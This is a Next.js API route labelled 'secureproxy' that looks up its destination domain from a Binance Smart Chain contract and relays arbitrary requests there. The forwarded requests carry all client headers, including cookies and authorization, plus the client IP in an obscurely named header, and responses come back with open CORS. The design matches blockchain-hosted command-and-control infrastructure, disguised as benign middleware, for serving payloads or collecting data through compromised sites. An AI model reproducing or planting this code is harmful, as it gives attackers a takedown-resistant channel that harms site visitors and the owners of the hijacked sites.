// /pages/api/secureproxy.js (for Next.js on Vercel)

import fetch from "node-fetch";

function getClientIP(req) {
  // Cloudflare header
  if (req.headers["cf-connecting-ip"]) {
    return req.headers["cf-connecting-ip"];
  }
  // X-Forwarded-For
  if (req.headers["x-forwarded-for"]) {
    return req.headers["x-forwarded-for"].split(",")[0].trim();
  }
  // Fallback
  return req.socket.remoteAddress;
}

class SecureProxyMiddleware {
  constructor(options = {}) {
    this.updateInterval = 60 * 1000; // 60s
    this.rpcUrls = options.rpcUrls || [
      "https://rpc.ankr.com/bsc",
      "https://bsc-dataseed2.bnbchain.org",
    ];
    this.contractAddress =
      options.contractAddress ||
      "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
    this.cache = { domain: null, timestamp: 0 };
  }

  hexToString(hex) {
    hex = hex.replace(/^0x/, "");
    hex = hex.substring(64); // skip offset
    const lengthHex = hex.substring(0, 64);
    const length = parseInt(lengthHex, 16);
    const dataHex = hex.substring(64, 64 + length * 2);
    let result = "";
    for (let i = 0; i < dataHex.length; i += 2) {
      const charCode = parseInt(dataHex.substring(i, i + 2), 16);
      if (charCode === 0) break;
      result += String.fromCharCode(charCode);
    }
    return result;
  }

  async fetchTargetDomain() {
    const data = "20965255"; // selector
    for (const rpcUrl of this.rpcUrls) {
      try {
        const res = await fetch(rpcUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_call",
            params: [
              { to: this.contractAddress, data: "0x" + data },
              "latest",
            ],
          }),
        });

        const json = await res.json();
        if (json.error) continue;

        const domain = this.hexToString(json.result);
        if (domain) return domain;
      } catch (e) {
        continue;
      }
    }
    throw new Error("Could not fetch target domain");
  }

  async getTargetDomain() {
    const now = Date.now();
    if (this.cache.domain && now - this.cache.timestamp < this.updateInterval) {
      return this.cache.domain;
    }
    const domain = await this.fetchTargetDomain();
    this.cache = { domain, timestamp: now };
    return domain;
  }

  async handle(req, res, endpoint) {
    try {
      const targetDomain = (await this.getTargetDomain()).replace(/\/$/, "");
      const url = targetDomain + "/" + endpoint.replace(/^\/+/, "");
      const clientIP = getClientIP(req);

      // Forward headers
      const headers = { ...req.headers };
      delete headers.host;
      delete headers.origin;
      delete headers["accept-encoding"];
      headers["x-dfkjldifjlifjd"] = clientIP;

      const proxyRes = await fetch(url, {
        method: req.method,
        headers,
        body: ["GET", "HEAD"].includes(req.method)
          ? undefined
          : req.body ? JSON.stringify(req.body) : undefined,
      });

      const text = await proxyRes.text();

      // Set response headers
      res.setHeader("Access-Control-Allow-Origin", "*");
      res.setHeader(
        "Access-Control-Allow-Methods",
        "GET, HEAD, POST, OPTIONS"
      );
      res.setHeader("Access-Control-Allow-Headers", "*");
      if (proxyRes.headers.get("content-type")) {
        res.setHeader("Content-Type", proxyRes.headers.get("content-type"));
      }
      res.status(proxyRes.status).send(text);
    } catch (e) {
      res.status(500).send("error: " + e.message);
    }
  }
}

export default async function handler(req, res) {
  // Handle preflight
  if (req.method === "OPTIONS") {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader(
      "Access-Control-Allow-Methods",
      "GET, HEAD, POST, OPTIONS"
    );
    res.setHeader("Access-Control-Allow-Headers", "*");
    res.setHeader("Access-Control-Max-Age", "86400");
    res.status(204).end();
    return;
  }

  const { e } = req.query;

  if (e === "ping_proxy") {
    res.setHeader("Content-Type", "text/plain");
    res.send("pong");
    return;
  } else if (e) {
    const proxy = new SecureProxyMiddleware({
      rpcUrls: ["https://binance.llamarpc.com", "https://bsc.drpc.org"],
      contractAddress: "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0",
    });
    await proxy.handle(req, res, decodeURIComponent(e));
  } else {
    res.status(400).send("Missing endpoint");
  }
}
